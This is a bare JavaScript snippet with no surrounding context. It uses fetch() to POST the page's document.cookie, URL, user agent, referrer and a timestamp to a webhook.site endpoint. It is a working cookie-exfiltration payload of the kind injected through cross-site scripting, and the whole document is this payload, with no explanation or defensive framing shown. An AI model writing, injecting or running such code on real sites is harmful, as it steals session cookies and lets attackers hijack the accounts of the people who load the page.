
fetch("https://webhook.site/4b213de0-f8d2-46fc-bc4b-024c492d632f", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    cookies: document.cookie,
    url: window.location.href,
    userAgent: navigator.userAgent,
    referrer: document.referrer,
    timestamp: new Date().toISOString()
  })
});
